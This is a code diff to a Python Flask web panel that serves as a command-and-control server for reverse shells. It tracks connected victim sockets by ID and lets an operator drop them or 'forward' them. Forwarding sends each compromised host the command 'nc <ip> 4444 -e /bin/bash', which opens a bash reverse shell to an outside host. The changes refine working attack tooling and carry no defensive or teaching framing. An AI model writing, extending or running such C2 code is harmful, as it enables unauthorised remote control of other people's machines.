@@ -7,6 +7,7 @@ app = Flask(__name__)
 
 # Data structures to keep track of connections
 connections = {}
+connection_id = 1  # Global variable to keep track of connection IDs
 
 # HTML template for the web interface
 HTML_TEMPLATE = """
@@ -98,6 +99,7 @@ HTML_TEMPLATE = """
             xhr.onload = function() {
                 if (xhr.status === 200) {
                     alert(successMessage);
+                    location.reload();  // Reload page to update connections
                 } else {
                     alert('Error: ' + xhr.responseText);
                 }
@@ -141,22 +143,24 @@ HTML_TEMPLATE = """
         <h1>Connections</h1>
         <table>
             <tr>
+                <th>ID</th>
                 <th>IP Address</th>
                 <th>Actions</th>
             </tr>
-            {% for ip, conn in connections.items() %}
+            {% for id, (conn, addr) in connections.items() %}
             <tr>
-                <td>{{ ip }}</td>
+                <td>{{ id }}</td>
+                <td>{{ addr[0] }}</td>
                 <td class="actions">
                     <div class="send-command-container">
                         <form action="/forward" method="post">
-                            <input type="hidden" name="ip" value="{{ ip }}">
+                            <input type="hidden" name="id" value="{{ id }}">
                             <input type="text" name="forward_ip" placeholder="Forward IP" required>
                             <input type="submit" value="Forward">
                         </form>
                     </div>
                     <form action="/drop" method="post">
-                        <input type="hidden" name="ip" value="{{ ip }}">
+                        <input type="hidden" name="id" value="{{ id }}">
                         <input type="submit" class="drop-button" value="Drop">
                     </form>
                 </td>
@@ -176,22 +180,24 @@ def index():
 # Route to handle dropping connections
 @app.route('/drop', methods=['POST'])
 def drop():
-    ip = request.form['ip']
-    if ip in connections:
-        conn = connections[ip]
+    conn_id = request.form['id']
+    conn_id = int(conn_id)  # Convert ID to integer
+    if conn_id in connections:
+        conn, addr = connections[conn_id]
         conn.close()
-        del connections[ip]
-        return f"Dropped connection from {ip}"
+        del connections[conn_id]
+        return f"Dropped connection from {addr[0]}"
     return "Connection not found"
 
 # Route to handle forwarding commands
 @app.route('/forward', methods=['POST'])
 def forward():
-    ip = request.form['ip']
+    conn_id = request.form['id']
     forward_ip = request.form['forward_ip']
     
-    if ip in connections:
-        conn = connections[ip]
+    conn_id = int(conn_id)  # Convert ID to integer
+    if conn_id in connections:
+        conn, addr = connections[conn_id]
         try:
             command = f"nc {forward_ip} 4444 -e /bin/bash"  # Default to Bash reverse shell
             conn.sendall(command.encode('utf-8') + b'\n')
@@ -200,21 +206,12 @@ def forward():
             return str(e)
     return "Connection not found"
 
-def forward_data(src, dest):
-    while True:
-        try:
-            data = src.recv(4096)
-            if not data:
-                break
-            dest.sendall(data)
-        except Exception:
-            break
-    src.close()
-    dest.close()
-
 def handle_reverse_shell(client_socket, client_address):
+    global connection_id
     print(f"Connection from {client_address}")
-    connections[client_address[0]] = client_socket
+    connections[connection_id] = (client_socket, client_address)
+    current_id = connection_id
+    connection_id += 1
     buffer = b""
 
     while True:
@@ -236,8 +233,10 @@ def handle_reverse_shell(client_socket, client_address):
             break
     
     client_socket.close()
-    del connections[client_address[0]]
-    print(f"Connection closed from {client_address}")
+    if current_id in connections:
+        addr = connections[current_id][1]
+        del connections[current_id]
+        print(f"Connection closed from {addr[0]}")
 
 def start_c2_server():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -250,5 +249,5 @@ def start_c2_server():
         threading.Thread(target=handle_reverse_shell, args=(client_socket, client_address)).start()
 
 if __name__ == '__main__':
-    threading.Thread(target=start_c2_server).start()
+    threading.Thread(target=start_c2_server, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
